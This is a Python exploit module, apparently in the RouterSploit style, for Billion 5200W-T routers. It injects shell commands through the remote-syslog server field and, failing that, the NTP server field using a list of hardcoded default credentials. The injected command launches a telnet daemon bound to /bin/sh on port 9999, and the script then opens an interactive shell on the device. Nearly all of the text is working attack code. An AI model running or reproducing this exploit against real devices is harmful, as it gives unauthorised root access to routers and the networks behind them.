# rsf exploit module
# description: Exploits Remote Command Execution vulnerability in Billion 5200W-T devices.

import re
import base64
from http.client import HTTPConnection
from telnetlib import Telnet


class Exploit:
    __info__ = {
        "name": "Billion 5200W-T RCE",
        "description": "Module exploits Remote Command Execution vulnerability in Billion 5200W-T devices.",
        "authors": (
            "Pedro Ribeiro <pedrib[at]gmail.com>",
            "Marcin Bury <marcin[at]threat9.com>",
        ),
        "references": (
            "http://seclists.org/fulldisclosure/2017/Jan/40",
            "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/zyxel_trueonline.txt",
            "https://blogs.securiteam.com/index.php/archives/2910",
        ),
        "devices": (
            "Billion 5200W-T",
        ),
    }

    def __init__(self):
        self.creds = [
            ("admin", "password"),
            ("true", "true"),
            ("user3", "12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678"),
        ]
        self.telnet_port = 9999
        self.target = ""
        self.port = 80
        self.username = "admin"
        self.password = "password"

    def run(self):
        cmd = "utelnetd -l /bin/sh -p {} -d".format(self.telnet_port)

        if self.execute1(cmd) or self.execute2(cmd):
            print("Trying to connect to the telnet server...")

            telnet_client = Telnet(self.target, self.telnet_port)
            telnet_client.interactive()
            telnet_client.close()
        else:
            print("Exploit failed")

    def execute1(self, cmd):
        print("Trying to exploit first command injection vulnerability...")
        payload = "1.1.1.1;{};#".format(cmd)

        data = {
            "RemotelogEnable": "1",
            "syslogServerAddr": payload,
            "serverPort": "514"
        }

        conn = HTTPConnection(self.target, self.port)
        conn.request("POST", "/cgi-bin/adv_remotelog.asp", body=str(data))
        response = conn.getresponse()

        if response.status != 404:
            return True

        print("Exploitation failed for unauthenticated command injection")
        return False

    def execute2(self, cmd):
        print("Trying authenticated command injection vulnerability...")

        for creds in set(self.creds + [(self.username, self.password)]):
            print("Trying exploitation with creds: {}:{}".format(creds[0], creds[1]))

            cookies = {"SESSIONID": "randomtext"}

            conn = HTTPConnection(self.target, self.port)
            conn.request("GET", "/", headers={'Cookie': cookies})
            response = conn.getresponse()

            if response.status != 200:
                return False

            payload = "\"%3b{}%26%23".format(cmd)

            data = {
                "SaveTime": "1",
                "uiCurrentTime2": "",
                "uiCurrentTime1": "",
                "ToolsTimeSetFlag": "0",
                "uiRadioValue": "0",
                "uiClearPCSyncFlag": "0",
                "uiwPCdateMonth": "0",
                "uiwPCdateDay": "",
                "&uiwPCdateYear": "",
                "uiwPCdateHour": "",
                "uiwPCdateMinute": "",
                "uiwPCdateSec": "",
                "uiCurTime": "N/A+(NTP+server+is+connecting)",
                "uiTimezoneType": "0",
                "uiViewSyncWith": "0",
                "uiPCdateMonth": "1",
                "uiPCdateDay": "",
                "uiPCdateYear": "",
                "uiPCdateHour": "",
                "uiPCdateMinute": "",
                "uiPCdateSec": "",
                "uiViewdateToolsTZ": "GMT+07:00",
                "uiViewdateDS": "Disable",
                "uiViewSNTPServer": payload,
                "ntp2ServerFlag": "N/A",
                "ntp3ServerFlag": "N/A",
            }

            conn.request("POST", "/cgi-bin/tools_time.asp", body=str(data))
            response = conn.getresponse()

            if response.status != 200:
                return False

        return True

